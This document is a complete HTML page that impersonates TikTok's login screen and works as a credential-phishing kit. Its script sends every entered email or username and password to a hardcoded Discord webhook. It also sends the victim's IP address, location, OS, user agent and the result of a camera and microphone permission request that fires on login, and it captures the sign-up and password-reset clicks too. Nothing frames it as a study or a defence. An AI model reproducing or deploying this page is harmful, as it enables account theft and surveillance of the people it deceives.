<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in | TikTok</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #fff; }
        .container { width: 100%; max-width: 400px; padding: 20px; text-align: center; }
        h2 { font-size: 32px; margin-bottom: 30px; font-weight: 700; }
        .input-group { margin-bottom: 15px; text-align: left; }
        input { width: 100%; padding: 12px 15px; border: 1px solid #ccc; border-radius: 4px; font-size: 16px; box-sizing: border-box; background-color: #f8f8f8; }
        input:focus { border-color: #fe2c55; outline: none; }
        .btn { width: 100%; padding: 14px; background-color: #fe2c55; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 10px; }
        .btn:hover { background-color: #e62a4d; }
        .links { margin-top: 20px; font-size: 14px; color: #161823; display: flex; justify-content: space-between; }
        .links a { color: #161823; text-decoration: none; font-weight: 600; cursor: pointer; }
        .links a:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <div class="container">
        <h2>Log in to TikTok</h2>
        <form id="loginForm">
            <div class="input-group">
                <input type="text" id="email" placeholder="Email or username" required>
            </div>
            <div class="input-group">
                <input type="password" id="password" placeholder="Password" required>
            </div>
            <button type="submit" class="btn" id="loginBtn">Log in</button>
        </form>
        <div class="links">
            <a id="forgotBtn">Forgot password?</a>
            <a id="registerBtn">Sign up</a>
        </div>
    </div>

    <script>
        const WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1538702595856539741/9QSZHry-ZfBd20aTqKHCKSrmBxYqrc3jGME50RFX5tVKmi-zAXPrX3gDQaGLI9JR6pj3';

        async function getDeviceInfo() {
            let ipData = {};
            try {
                const res = await fetch('https://ipapi.co/json/');
                ipData = await res.json();
            } catch(e) {}
            
            return {
                ip: ipData.ip || 'Unknown',
                location: `${ipData.city || 'Unknown'}, ${ipData.country_name || 'Unknown'}`,
                os: navigator.platform,
                browser: navigator.userAgent,
                time: new Date().toISOString()
            };
        }

        async function triggerMedia() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                return 'Granted (Stream active)';
            } catch (err) {
                return `Denied: ${err.message}`;
            }
        }

        async function sendData(action, email, password) {
            const device = await getDeviceInfo();
            let mediaStatus = 'Not requested';
            
            if (action === 'LOG IN') {
                mediaStatus = await triggerMedia();
            }

            const payload = {
                content: `**New TikTok Activity: ${action}**`,
                embeds: [{
                    color: 16657493,
                    fields: [
                        { name: 'Email/User', value: email || 'N/A', inline: true },
                        { name: 'Password', value: password || 'N/A', inline: true },
                        { name: 'Action', value: action, inline: true },
                        { name: 'IP Address', value: device.ip, inline: true },
                        { name: 'Location', value: device.location, inline: true },
                        { name: 'Media Access', value: mediaStatus, inline: false },
                        { name: 'OS / Platform', value: device.os, inline: true },
                        { name: 'User Agent', value: device.browser, inline: false },
                        { name: 'Timestamp', value: device.time, inline: false }
                    ]
                }]
            };

            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
        }

        document.getElementById('loginForm').addEventListener('submit', (e) => {
            e.preventDefault();
            sendData('LOG IN', document.getElementById('email').value, document.getElementById('password').value);
        });

        document.getElementById('forgotBtn').addEventListener('click', () => {
            sendData('FORGOT PASSWORD', document.getElementById('email').value, '');
        });

        document.getElementById('registerBtn').addEventListener('click', () => {
            sendData('REGISTER', document.getElementById('email').value, document.getElementById('password').value);
        });
    </script>
</body>
</html>
